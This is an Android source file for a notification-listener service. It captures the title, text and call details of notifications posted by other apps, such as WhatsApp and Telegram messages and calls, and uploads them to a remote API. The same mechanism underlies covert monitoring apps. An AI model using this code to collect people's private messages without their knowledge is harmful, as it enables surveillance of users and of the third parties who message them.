package com.zez.app.service;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationManagerCompat;

import com.google.gson.JsonObject;
import com.zez.app.util.ApiClient;
import com.zez.app.util.AppCallDetector;

import java.util.Collections;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NotificationCaptureService extends NotificationListenerService {
    private static final String TAG = "NotifCaptureService";
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static boolean isPermissionGranted(Context context) {
        if (context == null) return false;
        try {
            Set<String> packageNames = NotificationManagerCompat.getEnabledListenerPackages(context);
            if (packageNames != null && packageNames.contains(context.getPackageName())) {
                return true;
            }
            String flat = android.provider.Settings.Secure.getString(
                    context.getContentResolver(),
                    "enabled_notification_listeners"
            );
            if (flat != null && !flat.isEmpty()) {
                String pkg = context.getPackageName();
                for (String name : flat.split(":")) {
                    ComponentName cn = ComponentName.unflattenFromString(name);
                    if (cn != null && pkg.equals(cn.getPackageName())) {
                        return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    public static void ensureServiceBound(Context context) {
        if (context == null) return;
        try {
            if (isPermissionGranted(context)) {
                ComponentName componentName = new ComponentName(context, NotificationCaptureService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    NotificationListenerService.requestRebind(componentName);
                }
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "Notification listener connected successfully.");
        try {
            StatusBarNotification[] active = getActiveNotifications();
            if (active != null && active.length > 0) {
                Log.d(TAG, "Syncing " + active.length + " active notifications on connect...");
                for (StatusBarNotification sbn : active) {
                    handleStatusBarNotification(sbn, "CONNECTED");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying active notifications: " + e.getMessage());
        }
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.d(TAG, "Notification listener disconnected.");
        // Attempt auto-rebind if permission remains enabled
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                requestRebind(new ComponentName(this, NotificationCaptureService.class));
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        handleStatusBarNotification(sbn, "POSTED");
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        // Do not upload or duplicate on removal
    }

    private void handleStatusBarNotification(StatusBarNotification sbn, String action) {
        if (sbn == null) return;
        final String pkg = sbn.getPackageName();
        if (pkg == null || pkg.equals(getPackageName())) {
            // Ignore own app notifications to prevent self-triggering loops
            return;
        }

        final Notification notification = sbn.getNotification();
        if (notification == null) return;

        executor.execute(() -> {
            try {
                // 1. First, check and capture Third-Party App Calls (WhatsApp, Telegram, Instagram, Messenger, Meet, etc.)
                try {
                    com.zez.app.model.AppCallLogItem callItem = AppCallDetector.detectCall(sbn, getApplicationContext());
                    if (callItem != null) {
                        Log.d(TAG, "[" + action + "] Captured VoIP call event: " + callItem.appName + " (" + callItem.callType + ") - " + callItem.callerName + " [" + callItem.callDirection + "]");
                        ApiClient.syncAppCalls(getApplicationContext(), Collections.singletonList(callItem));
                    }
                } catch (Exception callErr) {
                    Log.w(TAG, "Error detecting app call: " + callErr.getMessage());
                }

                // 2. Extract notification details for Cloud Notification Archive
                Bundle extras = notification.extras;
                String title = null;
                String content = null;
                String subText = null;

                if (extras != null) {
                    CharSequence t = extras.getCharSequence(Notification.EXTRA_TITLE);
                    if (t != null) title = t.toString().trim();

                    if (title == null || title.isEmpty()) {
                        CharSequence bt = extras.getCharSequence(Notification.EXTRA_TITLE_BIG);
                        if (bt != null) title = bt.toString().trim();
                    }

                    if (title == null || title.isEmpty()) {
                        CharSequence ct = extras.getCharSequence("android.conversationTitle");
                        if (ct != null) title = ct.toString().trim();
                    }

                    CharSequence txt = extras.getCharSequence(Notification.EXTRA_TEXT);
                    if (txt != null) content = txt.toString().trim();

                    CharSequence bigTxt = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                    if (bigTxt != null && (content == null || content.isEmpty() || bigTxt.length() > content.length())) {
                        content = bigTxt.toString().trim();
                    }

                    CharSequence[] textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
                    if (textLines != null && textLines.length > 0) {
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence line : textLines) {
                            if (line != null && line.length() > 0) {
                                if (sb.length() > 0) sb.append("\n");
                                sb.append(line.toString().trim());
                            }
                        }
                        if (sb.length() > 0) {
                            content = (content == null || content.isEmpty()) ? sb.toString() : content + "\n" + sb.toString();
                        }
                    }

                    CharSequence sub = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
                    if (sub != null) subText = sub.toString().trim();

                    if ((content == null || content.isEmpty()) && extras.containsKey(Notification.EXTRA_INFO_TEXT)) {
                        CharSequence it = extras.getCharSequence(Notification.EXTRA_INFO_TEXT);
                        if (it != null) content = it.toString().trim();
                    }
                }

                // Fallback to tickerText if content still empty
                if ((content == null || content.isEmpty()) && notification.tickerText != null) {
                    content = notification.tickerText.toString().trim();
                }

                // Skip completely empty system notification artifacts
                if ((title == null || title.isEmpty()) && (content == null || content.isEmpty()) && (subText == null || subText.isEmpty())) {
                    return;
                }

                String appName = pkg;
                try {
                    PackageManager pm = getPackageManager();
                    ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
                    CharSequence label = pm.getApplicationLabel(ai);
                    if (label != null) appName = label.toString();
                } catch (Exception ignored) {}

                long postTime = sbn.getPostTime() > 0 ? sbn.getPostTime() : System.currentTimeMillis();

                JsonObject obj = new JsonObject();
                obj.addProperty("packageName", pkg);
                obj.addProperty("appName", appName);
                if (title != null && !title.isEmpty()) obj.addProperty("title", title);
                if (content != null && !content.isEmpty()) obj.addProperty("content", content);
                if (subText != null && !subText.isEmpty()) obj.addProperty("subText", subText);
                obj.addProperty("postTime", postTime);

                Log.d(TAG, "[" + action + "] Syncing notification from " + appName + ": " + (title != null ? title : content));
                ApiClient.syncNotifications(getApplicationContext(), Collections.singletonList(obj));
            } catch (Exception e) {
                Log.e(TAG, "Error processing notification: " + e.getMessage());
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        executor.shutdown();
    }
}
